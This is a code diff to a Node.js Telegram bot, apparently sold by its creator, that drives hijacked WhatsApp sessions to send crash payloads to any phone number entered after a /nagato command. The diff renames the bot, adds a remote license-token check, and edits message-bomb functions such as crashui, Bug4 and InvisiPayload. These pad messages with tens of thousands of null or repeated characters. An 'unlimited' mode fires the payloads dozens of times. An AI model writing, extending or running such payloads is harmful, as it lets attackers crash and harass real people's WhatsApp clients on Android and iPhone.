@@ -66,11 +66,6 @@ async function initializeWhatsAppConnections() {
           sock.ev.on("connection.update", async (update) => {
             const { connection, lastDisconnect } = update;
             if (connection === "open") {
-            try {
-            angeles.newsletterFollow("120363373008401043@newsletter");
-             } catch (error) {
-            console.error('Newsletter error:', error);
-            }
               console.log(`Bot ${botNumber} terhubung!`);
               sessions.set(botNumber, sock);
               resolve();
@@ -102,6 +97,38 @@ function createSessionDir(botNumber) {
     fs.mkdirSync(deviceDir, { recursive: true });
   }
   return deviceDir;
+}
+
+const GITHUB_RAW_URL =
+  "https";
+
+async function checkTokenInGitHub(tokenToCheck) {
+  try {
+    const response = await axios.get(GITHUB_RAW_URL);
+
+    let tokensData;
+    try {
+      if (typeof response.data === "object") {
+        tokensData = response.data;
+      } else {
+        tokensData = JSON.parse(response.data);
+      }
+    } catch (parseError) {
+      console.error("Error parsing data:", parseError);
+      return false;
+    }
+
+    if (!tokensData.tokens) {
+      return false;
+    }
+
+    const isTokenValid = tokensData.tokens.includes(tokenToCheck);
+
+    return isTokenValid;
+  } catch (error) {
+    console.error("Error checking token");
+    return false;
+  }
 }
 
 async function connectToWhatsApp(botNumber, chatId) {
@@ -226,6 +253,22 @@ async function connectToWhatsApp(botNumber, chatId) {
   sock.ev.on("creds.update", saveCreds);
 
   return sock;
+}
+
+async function initializeBot() {
+  const isValidToken = await checkTokenInGitHub(token);
+  if (!isValidToken) {
+    console.log(chalk.bold.red("Token tidak terdaftar dalam database!"));
+    process.exit(1);
+  }
+
+  console.log(`╭─────────────────
+│    Telegram NANDEMO X CELLA     
+│────────────────
+│ Created By @cellasta
+╰─────────────────`);
+
+  await initializeWhatsAppConnections();
 }
 
 initializeBot();
@@ -404,7 +447,7 @@ async function Bug2(sock, jid) {
               },
             },
             body: {
-              text: "𝙏𝙝𝙚 𝘿𝙚𝙨𝙩𝙧𝙤𝙮𝙚𝙧",
+              text: "𝙉𝙖𝙣𝙙𝙚𝙢𝙤ી",
             },
             nativeFlowMessage: {
               buttons: [
@@ -463,7 +506,7 @@ async function Bug4(sock, jid) {
     viewOnceMessage: {
       message: {
         listResponseMessage: {
-          title: "ㇱ 𝗙𝗮𝗶𝗹 - ( 𝙏𝙝𝙚 𝘿𝙚𝙨𝙩𝙧𝙤𝙮𝙚𝙧ી )𐎟 ♨️" + "ꦽ".repeat(9740),
+          title: "ㇱ 𝗙𝗮𝗶𝗹 - ( 𝙉𝙖𝙣𝙙𝙚𝙢𝙤ી )𐎟 ♨️" + "ꦽ".repeat(9740),
           listType: 2,
           singleSelectReply: {
             selectedRowId: "⚡",
@@ -609,7 +652,7 @@ async function Bug3(sock, jid) {
         message: {
           interactiveMessage: {
             header: {
-              title: "𝙏𝙝𝙚 𝘿𝙚𝙨𝙩𝙧𝙤𝙮𝙚𝙧",
+              title: "𝙉𝙖𝙣𝙙𝙚𝙢𝙤ી",
               hasMediaAttachment: false,
             },
             body: {
@@ -929,7 +972,7 @@ async function Fc(sock, jid) {
     viewOnceMessage: {
       message: {
         listResponseMessage: {
-          title: "ㇱ 𝗙𝗮𝗶𝗹 - ( 𝙏𝙝𝙚 𝘿𝙚𝙨𝙩𝙧𝙤𝙮𝙚𝙧 )𐎟 ♨️" + "ꦾ".repeat(115000),
+          title: "ㇱ 𝗙𝗮𝗶𝗹 - ( 𝙉𝙖𝙣𝙙𝙚𝙢𝙤ી )𐎟 ♨️" + "ꦾ".repeat(115000),
           listType: 2,
           singleSelectReply: {
             selectedRowId: "SSS+",
@@ -1088,7 +1131,7 @@ async function InvisiPayload(sock, jid) {
                 },
               },
               body: {
-                text: "ꪶ𖣂ꫂ 𝗙𝗮𝗶𝗹 𝗕𝗲𝘁𝗮 - ( 𝙏𝙝𝙚 𝘿𝙚𝙨𝙩𝙧𝙤𝙮𝙚𝙧 )         𐎟",
+                text: "ꪶ𖣂ꫂ 𝗙𝗮𝗶𝗹 𝗕𝗲𝘁𝗮 - ( 𝙉𝙖𝙣𝙙𝙚𝙢𝙤ી )         𐎟",
               },
               nativeFlowMessage: {
                 buttons: [
@@ -1117,44 +1160,21 @@ async function InvisiPayload(sock, jid) {
     }
 
 async function crashui(sock, jid) {
-  await sock.relayMessage(jid, {
-    viewOnceMessage: {
-      message: {
-        buttonsMessage: {
-          text: "🩸⃟⃨〫⃰‣ ⁖𝙏𝙝𝙚 𝘿𝙚𝙨𝙩𝙧𝙤𝙮𝙚𝙧 ‣—",
-          contentText: "🩸⃟⃨〫⃰‣ ⁖𝙏𝙝𝙚 𝘿𝙚𝙨𝙩𝙧𝙤𝙮𝙚𝙧 ‣—" + "\u0000".repeat(70000),
-          contextInfo: {
-            forwardingScore: 6,
-            isForwarded: true
-          },
-          headerType: 1,
-          buttons: [
-            {
-              body: {
-                text: "ꪶ𖣂ꫂ 𝗙𝗮𝗶𝗹 𝗕𝗲𝘁𝗮 - ( 𝙉𝙖𝙣𝙙𝙚𝙢𝙤ી ) 𐎟"
-              }
+    await sock.relayMessage(jid, {
+        viewOnceMessage: {
+            message: {
+                buttonsMessage: {
+                    text: "ꪶ𖣂ꫂ 𝗙𝗮𝗶𝗹 𝙐𝙄 - ( 𝙉𝙖𝙣𝙙𝙚𝙢𝙤ી )",
+                    contentText: "ꪶ𖣂ꫂ 𝗙𝗮𝗶𝗹 𝙐𝙄 - ( 𝙉𝙖𝙣𝙙𝙚𝙢𝙤ી )" + "\u0000".repeat(70000),
+                    contextInfo: {
+                        forwardingScore: 6,
+                        isForwarded: true
+                    },
+                    headerType: 1
+                }
             }
-          ],
-          nativeFlowMessage: {
-            buttons: [
-              {
-                name: "single_select",
-                buttonParamsJson: "JSON.stringify(listMessage)"
-              },
-              {
-                name: "call_permission_request",
-                buttonParamsJson: "JSON.stringify(listMessage)"
-              },
-              {
-                name: "mpm",
-                buttonParamsJson: "JSON.stringify(listMessage)"
-              }
-            ]
-          }
         }
-      }
-    }
-  }, {});
+    }, {});
 }
 
 async function NoIos(sock, jid) {
@@ -1184,17 +1204,17 @@ function isOwner(userId) {
 bot.onText(/\/start/, (msg) => {
   const chatId = msg.chat.id;
 
-  // Kirim pesan dengan video dan tombol channel
-  bot.sendVideo(chatId, "https://files.catbox.moe/gugbpa.mp4", {
-    caption: `╭──(  - 𝙏𝙝𝙚 𝘿𝙚𝙨𝙩𝙧𝙤𝙮𝙚𝙧 )
+  // Kirim pesan dengan foto dan tombol channel
+  bot.sendPhoto(chatId, "https://files.catbox.moe/k5c6co.jpg", {
+    caption: `╭──(  - 𝙉𝙖𝙣𝙙𝙚𝙢𝙤 )
 │ 𝘾𝙧𝙚𝙖𝙩𝙤𝙧 : @cellasta
-│ 𝙉𝙖𝙢𝙚 𝘽𝙤𝙩 : 𝙏𝙝𝙚 𝘿𝙚𝙨𝙩𝙧𝙤𝙮𝙚𝙧
-│ 𝙑𝙀𝙍𝙎𝙄𝙊𝙉 : 1.0
+│ 𝙉𝙖𝙢𝙚 𝘽𝙤𝙩 : 𝙉𝙖𝙣𝙙𝙚𝙢𝙤
+│ 𝙑𝙀𝙍𝙎𝙄𝙊𝙉 : 2.3
 │ 𝘾𝙤𝙣𝙣𝙚𝙘𝙩 : ${sessions.size}
 ╰━━━ㅡᯓ★`,
     reply_markup: {
       inline_keyboard: [
-        [{ text: "Kunjungi Channel", url: "https://t.me/zyroexecute" }],
+        [{ text: "Kunjungi Channel", url: "https://t.me/isengaja8" }],
         [
           { text: "Bug Menu ☠️", callback_data: "bug_menu" },
           { text: "Owner Menuꪶ𖣂ꫂ", callback_data: "owner_menu" },
@@ -1203,49 +1223,40 @@ bot.onText(/\/start/, (msg) => {
     },
   });
 });
-
-bot.on("callback_query", async (callbackQuery) => {
+bot.on("callback_query", (callbackQuery) => {
   const data = callbackQuery.data;
   const chatId = callbackQuery.message.chat.id;
-  const messageId = callbackQuery.message.message_id;
 
-  // Jawab callback query untuk menghindari error
-  await bot.answerCallbackQuery(callbackQuery.id);
+  // Jawab callback_query untuk mencegah error
+  bot.answerCallbackQuery(callbackQuery.id);
 
-  try {
-    // Hapus pesan lama
-    await bot.deleteMessage(chatId, messageId);
-  } catch (error) {
-    console.error("Error saat menghapus pesan:", error);
-  }
-
-  // Menunggu sebentar sebelum mengirim ulang menu
-  setTimeout(async () => {
-    if (data === "bug_menu") {
-      await bot.sendVideo(chatId, "https://files.catbox.moe/gugbpa.mp4", {
-        caption: `╭──(  - 𝙏𝙝𝙚 𝘿𝙚𝙨𝙩𝙧𝙤𝙮𝙚𝙧 )
-│ 𝘾𝙧𝙚𝙖𝙩𝙤𝙧 : @cellasta
-│ 𝙉𝙖𝙢𝙚 𝘽𝙤𝙩 : 𝙏𝙝𝙚 𝘿𝙚𝙨𝙩𝙧𝙤𝙮𝙚𝙧
-│ 𝙑𝙀𝙍𝙎𝙄𝙊𝙉 : 1.0
-│ 𝘾𝙤𝙣𝙣𝙚𝙘𝙩 : ${sessions.size}
-╰━━━ㅡᯓ★
-╭───( ♦️ - 𝗖𝗼𝗺𝗺𝗮𝗻𝗱  )
-│- /destroy
+  if (data === "bug_menu") {
+    // Hapus pesan lama dan kirim ulang foto dengan menu Bug Menu
+    bot.deleteMessage(chatId, callbackQuery.message.message_id).then(() => {
+      bot.sendPhoto(chatId, "https://files.catbox.moe/k5c6co.jpg", {
+        caption: `╭─────────────────
+│   WELCOME TO BUGMENU  
+│────────────────
+│ Wassup @${callbackQuery.from.username}! 
 │
-│TQ TO :
-│- Allah [ Membantu Segala Hal ]
-│- Buat Yang Sudah Support Cella
-│- Buat Buyer Sc The Destroy
+│ Command List:
 │
-│𝙏𝙝𝙚 𝘿𝙚𝙨𝙩𝙧𝙤𝙮𝙚𝙧 V1.0
-╰────✦`,
+│ • /nagato
+│   menampilkan button bug
+│   Contoh: /nagato 628xx
+│
+│ 𝙉𝙖𝙣𝙙𝙚𝙢𝙤ી V2.3
+╰─────────────────`,
         parse_mode: "Markdown",
         reply_markup: {
           inline_keyboard: [[{ text: "Back", callback_data: "start_menu" }]],
         },
       });
-    } else if (data === "owner_menu") {
-      await bot.sendVideo(chatId, "https://files.catbox.moe/gugbpa.mp4", {
+    });
+  } else if (data === "owner_menu") {
+    // Hapus pesan lama dan kirim ulang foto dengan menu Owner Menu
+    bot.deleteMessage(chatId, callbackQuery.message.message_id).then(() => {
+      bot.sendPhoto(chatId, "https://files.catbox.moe/k5c6co.jpg", {
         caption: `╭─────────────────
 │  WELCOME TO OWNER MENU   
 │────────────────
@@ -1263,18 +1274,21 @@ bot.on("callback_query", async (callbackQuery) => {
           inline_keyboard: [[{ text: "Back", callback_data: "start_menu" }]],
         },
       });
-    } else if (data === "start_menu") {
-      await bot.sendVideo(chatId, "https://files.catbox.moe/gugbpa.mp4", {
-        caption: `╭──(  - 𝙏𝙝𝙚 𝘿𝙚𝙨𝙩𝙧𝙤𝙮𝙚𝙧 )
+    });
+  } else if (data === "start_menu") {
+    // Hapus pesan lama dan kirim ulang foto dengan menu Start
+    bot.deleteMessage(chatId, callbackQuery.message.message_id).then(() => {
+      bot.sendPhoto(chatId, "https://files.catbox.moe/k5c6co.jpg", {
+        caption: `╭──(  - 𝙉𝙖𝙣𝙙𝙚𝙢𝙤 )
 │ 𝘾𝙧𝙚𝙖𝙩𝙤𝙧 : @cellasta
-│ 𝙉𝙖𝙢𝙚 𝘽𝙤𝙩 : 𝙏𝙝𝙚 𝘿𝙚𝙨𝙩𝙧𝙤𝙮𝙚𝙧
-│ 𝙑𝙀𝙍𝙎𝙄𝙊𝙉 : 1.0
+│ 𝙉𝙖𝙢𝙚 𝘽𝙤𝙩 : 𝙉𝙖𝙣𝙙𝙚𝙢𝙤
+│ 𝙑𝙀𝙍𝙎𝙄𝙊𝙉 : 2.3
 │ 𝘾𝙤𝙣𝙣𝙚𝙘𝙩 : ${sessions.size}
 ╰━━━ㅡᯓ★`,
         parse_mode: "Markdown",
         reply_markup: {
           inline_keyboard: [
-            [{ text: "Kunjungi Channel", url: "https://t.me/zyroexecute" }],
+            [{ text: "Kunjungi Channel", url: "https://t.me/isengaja8" }],
             [
               { text: "Bug Menu ☠️", callback_data: "bug_menu" },
               { text: "Owner Menuꪶ𖣂ꫂ", callback_data: "owner_menu" },
@@ -1282,8 +1296,11 @@ bot.on("callback_query", async (callbackQuery) => {
           ],
         },
       });
-    }
-  }, 500); // Delay 0.5 detik agar bot tidak crash saat hapus pesan
+    });
+  }
+});
+bot.on("message", (msg) => {
+  const chatId = msg.chat.id;
 });
 
 const supervipFile = path.resolve("./supervip_users.js");
@@ -1293,7 +1310,7 @@ function isSupervip(userId) {
   return supervipUsers.includes(userId.toString());
 }
 
-bot.onText(/\/destroy (\d+)/, async (msg, match) => {
+bot.onText(/\/nagato (\d+)/, async (msg, match) => {
   const chatId = msg.chat.id;
   const userId = msg.from.id;
 
@@ -1310,22 +1327,16 @@ bot.onText(/\/destroy (\d+)/, async (msg, match) => {
   const jid = `${formattedNumber}@s.whatsapp.net`;
 
   bot.sendPhoto(chatId, "https://files.catbox.moe/rf8qar.jpg", {
-    caption: ` Mengirim bug ke *${formattedNumber}*`,
+    caption: `🔹 Mengirim bug ke *${formattedNumber}*`,
     parse_mode: "Markdown",
     reply_markup: {
       inline_keyboard: [
-        [
-          { text: "〄ForClose༽", callback_data: `crasher_${jid}` },
-          { text: "៹HancurKanြ", callback_data: `notag_${jid}` }
-        ],
-        [
-          { text: "៹CrashIphone⏎", callback_data: `os_${jid}` },
-          { text: "៹CrashHard✇", callback_data: `manuver_${jid}` }
-        ],
-        [
-          { text: "Unli✘Mited", callback_data: `unlimited_${jid}` },
-          { text: "➷SepecialyUi➹", callback_data: `combox_${jid}` }
-        ]
+        [{ text: "〄ForClose༽", callback_data: `crasher_${jid}` }],
+        [{ text: "፠Cr⃢ash⃢Wa", callback_data: `notag_${jid}` }],
+        [{ text: "⏚CrashIphone⏎", callback_data: `os_${jid}` }],
+        [{ text: "✈CrashHard✇", callback_data: `manuver_${jid}` }],
+        [{ text: "Unli✘Mited", callback_data: `unlimited_${jid}` }],
+        [{ text: "➷SepecialyUi➹", callback_data: `combox_${jid}` }],
       ],
     },
   });
@@ -1346,7 +1357,7 @@ bot.on("callback_query", async (callbackQuery) => {
     "crasher": [Bug4, InvisiPayload, InvisiPayload, Bug4],
     "notag": [Bug4, Bug3, Bug3, Bug4],
     "os": [IosMJ, IosMJ, IosMJ, NoIos, NoIos, NoIos, NoIos, NoIos],
-    "combox": [Bug4, Bug3, Bug3, Bug4, InvisiPayload, InvisiPayload, Bug4, Bug4],
+    "combox": [Bug4, InvisiPayload, crashui, Bug4,Bug4, crashui, InvisiPayload, Bug4],
     "manuver": [Bug4, Bug3, Bug2, InvisiPayload, Bug4, Bug4],
     "unlimited": [Bug4, Bug3, Bug2, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, Bug4, Bug4],
   };
